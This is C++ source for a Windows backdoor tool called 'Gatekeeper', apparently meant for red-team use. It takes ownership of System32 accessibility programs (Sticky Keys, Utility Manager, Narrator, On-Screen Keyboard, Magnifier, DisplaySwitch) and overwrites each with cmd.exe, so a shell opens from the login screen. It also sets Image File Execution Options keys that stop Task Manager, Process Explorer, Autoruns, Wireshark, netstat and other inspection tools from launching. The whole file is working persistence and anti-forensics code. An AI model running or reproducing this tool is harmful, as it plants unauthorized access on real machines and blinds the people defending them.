#include <iostream>
#include <cstdlib>
#include <fstream>
#include <vector>
#include <string>

#include <iostream>

void gatekeeper_art() {
    std::cout << std::endl;
    //prints top half
    std::cout << "\033[93m GGGG   AAAAA  TTTTT  EEEEE   K   K  EEEEE  EEEEE  PPPPP  EEEEE  RRRR\033[0m" 
              << "\033[93m         .-\"\"-.  \033[0m" << std::endl;
    std::cout << "\033[93mG       A   A    T    E       K  K   E      E      P   P  E      R   R\033[0m" 
              << "\033[93m       / .--. \\  \033[0m" << std::endl;
    std::cout << "\033[93mG  GG   AAAAA    T    EEEE    KKK    EEEE   EEEE   PPPP   EEEE   RRRR\033[0m" 
              << "\033[93m       / /    \\ \\ \033[0m" << std::endl;
    std::cout << "\033[93mG   G   A   A    T    E       K  K   E      E      P      E      R  R\033[0m" 
              << "\033[93m       | |    | | \033[0m" << std::endl;
    std::cout << "\033[93m GGGG   A   A    T    EEEEE   K   K  EEEEE  EEEEE  P      EEEEE  R   R\033[0m" 
              << "\033[93m      | |.-\"\"-.| \033[0m" << std::endl;

    //prints bottom half
    std::cout << "\033[93m                                                                           ///`.::::.`\\\033[0m" << std::endl;
    std::cout << "\033[93m======================================================================\033[0m    " << "\033[93m||| ::/  \\:: ;\033[0m" << std::endl;
    std::cout << "\033[93m======================================================================\033[0m    " << "\033[93m||; ::\\__/:: ;\033[0m" << std::endl;
    std::cout << "\033[93m======================================================================\033[0m    " << "\033[93m \\\\\\ '::::' / \033[0m" << std::endl;
    std::cout << "\033[93m======================================================================\033[0m    " << "\033[93m  `=':-..-'`\033[0m" << std::endl;
    std::cout << std::endl;
}

void error_handling(int status, const std::string& command) {
    if (status != 0) {
        std::cout << "\033[1;31mError Running Command: \033[0m" << command << std::endl;
        exit(EXIT_FAILURE);
    }
}

void priv_esc() {
    //grants administrative permissions to sethc.exe (Sticky Keys)
    error_handling(system("takeown /f C:\\Windows\\System32\\sethc.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\sethc.exe");
    error_handling(system("icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F");
    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Sticky Keys\033[0m" << std::endl;

    //grants administrative permissions to utilman.exe (Utility Manager)
    error_handling(system("takeown /f C:\\Windows\\System32\\utilman.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\utilman.exe");
    error_handling(system("icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F");
    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Utility Manager\033[0m" << std::endl;

    //grants administrative permissions to narrator.exe (Narrator)
    error_handling(system("takeown /f C:\\Windows\\System32\\narrator.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\narrator.exe");
    error_handling(system("icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F");
    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Narrator\033[0m" << std::endl;

    //grants administrative permissions to osk.exe (On Screen Keyboard)
    error_handling(system("takeown /f C:\\Windows\\System32\\osk.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\osk.exe");
    error_handling(system("icacls C:\\Windows\\System32\\osk.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\osk.exe /grant administrators:F");
    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for On Screen Keyboard\033[0m" << std::endl;

    //grants administrative permissions to sethc.exe (Magnifier)
    error_handling(system("takeown /f C:\\Windows\\System32\\magnify.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\magnify.exe");
    error_handling(system("icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F");
    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Magnifier\033[0m" << std::endl;

    //grants administrative permissions to displayswitch.exe (Display)
    error_handling(system("takeown /f C:\\Windows\\System32\\displayswitch.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\displayswitch.exe");
    error_handling(system("icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F");
    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Display\033[0m" << std::endl;
}

void cleanup() {
    //searches through system32 to find previously-run backdoors
    system("dir C:\\Windows\\System32\\old-*.* /b /s > C:\\Windows\\System32\\old_files.txt 2> nul");
    std::vector<std::string> replacedExecutables;
    std::ifstream file("C:\\Windows\\System32\\old_files.txt");
    std::string line;

    //reads each line from the file and add to the vector
    while (std::getline(file, line)) {
        replacedExecutables.push_back(line);
    }
    file.close();

    //restores original executables by renaming old-* files back to their original names
    //also deletes previous backdoor executables
    for (const std::string& executable : replacedExecutables) {
        std::string original = executable;
        original.replace(executable.find("old-"), 4, "");
        //deletes previous backdoors
        std::string delCommand = "del " + original;
        //std::cout << delCommand << std::endl; testing
        error_handling(system(delCommand.c_str()), delCommand.c_str());
        //restores original executables
        std::string renameCommand = "move \"" + executable + "\" \"" + original + "\"";
        //std::cout << renameCommand << std::endl; testing
        error_handling(system((renameCommand + " > nul 2>&1").c_str()), renameCommand.c_str());
        std::cout << "\033[1;32m\tRemoved Previous Backdoor\033[0m" << std::endl;
    }
}

void sticky_keys() {
    //makes sure that sticky keys is turned on
    error_handling(system("reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f >nul 2>&1"), 
    "reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f");
    
    //replaces sethc.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\sethc.exe old-sethc.exe >nul 2>&1"), "rename C:\\Windows\\System32\\sethc.exe old-sethc.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe");
}

void utility_manager() {
    //replaces utilman.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\utilman.exe old-utilman.exe >nul 2>&1"), "rename C:\\Windows\\System32\\utilman.exe old-utilman.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe");
}

void narrator() {
    //replaces narrator.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\narrator.exe old-narrator.exe >nul 2>&1"), "rename C:\\Windows\\System32\\narrator.exe old-narrator.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe");
}

void on_screen_keyboard() {
    //replaces osk.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\osk.exe old-osk.exe >nul 2>&1"), "rename C:\\Windows\\System32\\osk.exe old-osk.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe");
}

void magnifier() {
    //replaces magnify.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\magnify.exe old-magnify.exe >nul 2>&1"), "rename C:\\Windows\\System32\\magnify.exe old-magnify.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe");
}

void display_switch() {
    //replaces displayswitch.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe >nul 2>&1"), "rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe");
}

void ifeo_keys() {
    //switches all important thrunting tools to execute conhost.exe
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"), 
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"), 
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autorunsc.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autorunsc.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autorunsc64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autorunsc64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Autoruns IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Process Explorer IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procmon.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procmon.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procmon64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procmon64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Process Monitor IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\strings.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\strings.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\strings64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\strings64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Strings IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tcpview.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tcpview.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tcpview64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tcpview64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded TCPView IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wireshark.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wireshark.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Wireshark IFEO Registry Key\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Task Manager IFEO Registry Key\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\netstat.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\netstat.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Netstat IFEO Registry Key\033[0m" << std::endl;
}

int main(int argc, char *argv[]){
    //clears terminal
    error_handling(system("cls"), "cls");

    //runs gatekeeper art
    gatekeeper_art();

    //grants administrator permissions to all backdoor executables
    std::cout << "Gaining Permissions..." << std::endl;
    priv_esc();

    //enables all windows hotkeys
    error_handling(system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f >nul 2>&1"), 
    "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f");
    std::cout << "\033[1;32m\tSuccessfully Enabled All Windows Hotkeys\033[0m" << std::endl;

    //cleans up previous runs beforehand
    std::cout << "Cleaning Up Previous Backdoors..." << std::endl;
    cleanup();

    //executes selected backdoors
    std::cout << "Executing Backdoors..." << std::endl;
    if (argc == 1) {
        sticky_keys();
        std::cout << "\033[1;32m\tExecuted Sticky Keys Backdoor\033[0m" << std::endl;
        utility_manager();
        std::cout << "\033[1;32m\tExecuted Utility Manager Backdoor\033[0m" << std::endl;
        narrator();
        std::cout << "\033[1;32m\tExecuted Narrator Backdoor\033[0m" << std::endl;
        on_screen_keyboard();
        std::cout << "\033[1;32m\tExecuted On Screen Keyboard Backdoor\033[0m" << std::endl;
        magnifier();
        std::cout << "\033[1;32m\tExecuted Magnifier Backdoor\033[0m" << std::endl;
        display_switch();
        std::cout << "\033[1;32m\tExecuted Display Switch Backdoor\033[0m" << std::endl;
    }
    else {
        for (int i = 1; i < argc; i++) {
            const std::string arg = argv[i];
            if (arg == "sk") {
                sticky_keys();
                std::cout << "\033[1;32m\tExecuted Sticky Keys Backdoor\033[0m" << std::endl;
            } else if (arg == "um") {
                utility_manager();
                std::cout << "\033[1;32m\tExecuted Utility Manager Backdoor\033[0m" << std::endl;
            } else if (arg == "n") {
                narrator();
                std::cout << "\033[1;32m\tExecuted Narrator Backdoor\033[0m" << std::endl;
            } else if (arg == "osk") {
                on_screen_keyboard();
                std::cout << "\033[1;32m\tExecuted On Screen Keyboard Backdoor\033[0m" << std::endl;
            } else if (arg == "m") {
                magnifier();
                std::cout << "\033[1;32m\tExecuted Magnifier Backdoor\033[0m" << std::endl;
            } else if (arg == "ds") {
                display_switch();
                std::cout << "\033[1;32m\tExecuted Display Switch Backdoor\033[0m" << std::endl;
            } else {
                std::cout << "\033[1;31m\tInvalid Argument: \033[0m" << arg << std::endl;
            }
        }
    }

    //sets IFEO registry keys
    std::cout << "Adding IFEO Registry Keys..." << std::endl;
    ifeo_keys();

    return 0;
}